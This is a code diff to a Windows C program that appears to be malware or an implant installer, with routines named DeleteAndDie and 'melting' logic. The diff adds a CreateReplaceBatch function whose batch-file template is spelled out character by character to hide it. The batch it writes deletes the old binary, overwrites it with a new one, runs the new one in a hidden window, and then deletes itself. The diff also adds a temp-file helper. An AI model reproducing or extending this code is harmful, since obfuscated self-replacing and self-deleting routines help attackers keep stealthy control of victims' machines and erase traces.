@@ -81,6 +81,7 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 		{
 			DeleteAndDie(FALSE);
 		}
+
 		if (uMelted)
 		{
 			*uSynchro = 1;
@@ -493,7 +494,7 @@ PWCHAR GetTemp()
 	PWCHAR pTemp = (PWCHAR)malloc(4096 * sizeof(WCHAR));
 	PWCHAR pShort = (PWCHAR)malloc(4096 * sizeof(WCHAR));
 
-	GetEnvironmentVariable(L"TMP", pTemp, 32767);
+	GetEnvironmentVariable(L"TMP", pTemp, 32767); // FIXME GetTempPath
 	GetShortPathName(pTemp, pShort, 4096);
 
 	free(pTemp);
@@ -527,6 +528,9 @@ BOOL StartBatch(PWCHAR pName)
 	si.dwFlags = STARTF_USESHOWWINDOW;
 	si.wShowWindow = SW_HIDE;
 	
+	if (GetCurrentProcessId() == 4)
+		MessageBox(NULL, L"I'm going to start it", L"WARNING", 0);
+
 	BOOL bRet = CreateProcess(pInterpreter, pApplicationName, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
 
 	free(pApplicationName);
@@ -565,6 +569,36 @@ VOID CreateDeleteBatch(PWCHAR pFileName, PWCHAR *pBatchOutName)
 }
 
 
+VOID CreateReplaceBatch(PWCHAR pOldFile, PWCHAR pNewFile, PWCHAR *pBatchOutName)
+{
+	HANDLE hFile;
+	ULONG uTick, uOut;
+	PWCHAR pTempPath = GetTemp();
+	PWCHAR pBatchName = (PWCHAR) malloc(32767*sizeof(WCHAR));
+	CHAR pBatchFormat[] = { '@', 'e', 'c', 'h', 'o', ' ', 'o', 'f', 'f', '\r', '\n', ':', 'd', '\r', '\n', 'd', 'e', 'l', ' ', '"', '%', 'S', '"', '\r', '\n', 'i', 'f', ' ', 'e', 'x', 'i', 's', 't', ' ', '"', '%', 'S', '"', ' ', 'g', 'o', 't', 'o', ' ', 'd', '\r', '\n', 't', 'y', 'p', 'e', ' ', '"', '%', 'S', '"', ' ', '>', ' ', '"', '%', 'S', '"', '\r', '\n', 's', 't', 'a', 'r', 't', ' ', '/', 'B', ' ', 'c', 'm', 'd', ' ', '/', 'c', ' ', '"', '%', 'S', '"', '\r', '\n', 'd', 'e', 'l', ' ', '/', 'F', ' ', '"', '%', 'S', '"', '\r', '\n', 'd', 'e', 'l', ' ', '/', 'F', ' ', '"', '%', 'S', '"', 0x0 };
+	PCHAR pBatchBuffer = (PCHAR) malloc(strlen(pBatchFormat) + (32767 * 3));
+
+	uTick = GetTickCount();
+	do
+	{
+		_snwprintf_s(pBatchName, 32766, _TRUNCATE, L"%s\\%d.bat", pTempPath, uTick++);
+		hFile = CreateFile(pBatchName, GENERIC_READ|GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (hFile && hFile != INVALID_HANDLE_VALUE)
+			break;
+	}
+	while (1);
+
+	_snprintf_s(pBatchBuffer, strlen(pBatchFormat) + (32767 * 3), _TRUNCATE, pBatchFormat, pOldFile, pOldFile, pNewFile, pOldFile, pOldFile, pNewFile, pBatchName); 
+	WriteFile(hFile, pBatchBuffer, strlen(pBatchBuffer), &uOut, NULL);
+	CloseHandle(hFile);
+
+	*pBatchOutName = pBatchName;
+
+	free(pBatchBuffer);
+	free(pTempPath);
+}
+
+
 VOID CreateCopyBatch(PWCHAR pSource, PWCHAR pDest, PWCHAR *pBatchOutName)
 {
 	HANDLE hFile;
@@ -593,4 +627,29 @@ VOID CreateCopyBatch(PWCHAR pSource, PWCHAR pDest, PWCHAR *pBatchOutName)
 
 	free(pBatchBuffer);
 	free(pTempPath);
+}
+
+
+LPWSTR CreateTempFile()
+{
+	WCHAR pTempPath[MAX_PATH + 1];
+	LPWSTR pShortTempPath = (LPWSTR) malloc((MAX_PATH + 1)*sizeof(WCHAR));
+	LPWSTR pTempFileName = (LPWSTR) malloc((MAX_PATH + 1)*sizeof(WCHAR));
+	LPWSTR pShortTempFileName = (LPWSTR) malloc((MAX_PATH + 1)*sizeof(WCHAR));
+
+	memset(pTempPath, 0x0, (MAX_PATH + 1)*sizeof(WCHAR));
+	memset(pShortTempPath, 0x0, (MAX_PATH + 1)*sizeof(WCHAR));
+	memset(pTempFileName, 0x0, (MAX_PATH + 1)*sizeof(WCHAR));
+	memset(pShortTempFileName, 0x0, (MAX_PATH + 1)*sizeof(WCHAR));
+
+	GetTempPath(MAX_PATH + 1, pTempPath);
+	GetShortPathName(pTempPath, pShortTempPath, (MAX_PATH + 1)*sizeof(WCHAR));
+
+	GetTempFileName(pTempPath, L"00", 0, pTempFileName);
+	GetShortPathName(pTempFileName, pShortTempFileName, (MAX_PATH + 1)*sizeof(WCHAR));
+
+	free(pShortTempPath);
+	free(pTempFileName);
+
+	return pShortTempFileName;
 }
